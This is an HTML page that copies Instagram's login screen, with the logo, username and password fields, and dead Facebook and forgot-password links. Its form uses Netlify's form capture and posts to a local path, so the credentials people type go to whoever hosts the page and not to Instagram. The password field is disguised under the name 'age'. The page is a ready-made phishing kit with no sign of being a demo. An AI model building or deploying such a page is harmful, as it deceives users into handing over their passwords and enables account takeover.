<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="assets/css/main.css">
  <title>Instagram</title>
<link rel="icon" type="image/x-icon" href="/assets/img/favicon1.png">


</head>
<body>
  <main class="l-main">
      <div class="l-main__img">
        <img src="assets/img/homepage.png" alt="Smartphones">
      </div>
      <div class="l-user">
        <div class="c-panel group">
          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
          <div class="c-panel__form">
            <form method="post" action="./form/index.html" id="myForm" netlify>

                <input id="name" name="name" style="width:250px" type="text" class="c-panel__input" placeholder="Phone number, username, or email">
                <input name="age" id="age" style="width:250px" type="password" class="c-panel__input" placeholder="Password"> <br>
          
           

              <button style="width:250px;height:50%"  type="submit" class="c-btn">Log In</button>
            
            </form>
            
            <span class="c-panel__span">OR</span>
          </div>
          <a href="#" class="c-panel__facebook">Login with Facebook</a>
          <a href="#" class="c-panel__forgot">Forgot password?</a>
        </div>
        <div class="c-signup group">
          <p>Don't have an account? <span>Sign up</span></p>
        </div>
        <div class="c-app">
          <p>Get the app.</p>
          <div class="c-app__download">
            <img src="assets/img/apple.png" alt="Apple Store">
            <img src="assets/img/google.png" alt="Google Play">
          </div>
        </div>
      </div>
  </main>


  
</body>
</html>
